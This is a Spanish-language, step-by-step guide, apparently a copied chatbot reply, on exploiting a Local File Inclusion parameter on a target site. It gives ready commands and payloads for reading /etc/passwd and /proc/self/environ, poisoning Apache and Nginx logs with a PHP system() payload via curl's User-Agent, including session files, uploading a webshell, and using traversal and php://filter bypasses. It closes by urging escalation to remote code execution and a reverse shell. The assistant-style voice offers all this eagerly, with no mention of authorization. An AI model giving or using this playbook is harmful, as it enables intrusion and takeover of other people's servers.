
¡Nice! 😎 Si tienes un **LFI (Local File Inclusion)** con un parámetro como:

arduino

CopiarEditar

`http://victima.com/index.php?filename=algo`

...estás en terreno fértil 🔥. Ahora puedes hacer **muchísimo** dependiendo de la configuración del servidor y lo que puedas alcanzar desde ahí.

Vamos paso por paso. Aquí te dejo **una checklist** de lo que puedes probar.

---

## ✅ 1. **Leer archivos sensibles del sistema**

Empieza por probar archivos comunes:

#### En sistemas Linux:

bash

CopiarEditar

`/etc/passwd /etc/hosts /etc/hostname /proc/self/environ /var/log/apache2/access.log`

#### Ejemplo:

bash

CopiarEditar

`http://victima.com/index.php?filename=/etc/passwd`

---

## ✅ 2. **Buscar `PHP_SELF` o `environ` para inyectar código (RCE)**

### 💥 _/proc/self/environ_ (puedes inyectar código en la variable `User-Agent`)

1. Usa curl con un `User-Agent` con PHP:
    

bash

CopiarEditar

`curl -A "<?php system($_GET['cmd']); ?>" http://victima.com/`

2. Luego accede a:
    

bash

CopiarEditar

`http://victima.com/index.php?filename=/proc/self/environ&cmd=whoami`

💡 Esto funciona si el servidor **incluye lo que hay en `environ`** como si fuera código PHP, y si no tiene `disable_functions`.

---

## ✅ 3. **Log Poisoning (inyectar código en logs)**

1. Manda una petición con código PHP en la URL o el User-Agent:
    

bash

CopiarEditar

`curl -A "<?php system($_GET['cmd']); ?>" http://victima.com/test.php`

2. LFI apunta al archivo de logs:
    

- Apache:
    
    swift
    
    CopiarEditar
    
    `/var/log/apache2/access.log /var/log/httpd/access_log`
    
- Nginx:
    
    pgsql
    
    CopiarEditar
    
    `/var/log/nginx/access.log`
    

3. Luego accede con:
    

bash

CopiarEditar

`http://victima.com/index.php?filename=/var/log/apache2/access.log&cmd=id`

---

## ✅ 4. **Incluir sesiones de PHP**

Si el servidor guarda las sesiones en disco (muy común), puedes tratar de incluirlas.

Rutas típicas:

- `/var/lib/php/sessions/sess_<id>`
    
- `/tmp/sess_<id>`
    

1. Loguéate en la app o crea una sesión.
    
2. Mira la cookie `PHPSESSID`.
    
3. Accede:
    

bash

CopiarEditar

`http://victima.com/index.php?filename=/var/lib/php/sessions/sess_abcd1234`

💡 Si puedes inyectar contenido en la sesión (por ejemplo, a través de un campo de usuario), podrías meter PHP ahí.

---

## ✅ 5. **Incluir archivos subidos (webshells)**

Si la web tiene subida de archivos (y los sube a una carpeta accesible para el include), puedes intentar subir una webshell:

1. Sube un archivo `.php` con contenido como:
    

php

CopiarEditar

`<?php system($_GET['cmd']); ?>`

2. Luego accede con:
    

bash

CopiarEditar

`http://victima.com/index.php?filename=uploads/shell.php&cmd=id`

💡 Si no puedes acceder directamente por URL (por restricciones), pero sí puedes incluirlo, aún puedes ejecutarlo.

---

## ✅ 6. **Burlar filtros con rutas relativas o wrappers**

- Bypass con rutas:
    

bash

CopiarEditar

`?filename=../../../../../../etc/passwd`

- Wrapper de `php://filter` para ver el código fuente:
    

bash

CopiarEditar

`?filename=php://filter/convert.base64-encode/resource=index.php`

Eso te da el código fuente de `index.php` en base64, útil si quieres auditarlo para descubrir más cosas.

---

## 🚀 Siguiente objetivo: **RCE**

Tu misión ahora es combinar el LFI con:

- **log poisoning**
    
- **`/proc/self/environ`**
    
- **sesiones**
    
- **wrappers raros**
    
- **upload de archivos**
    

Para lograr **Remote Code Execution** y pivotar a una reverse shell 💣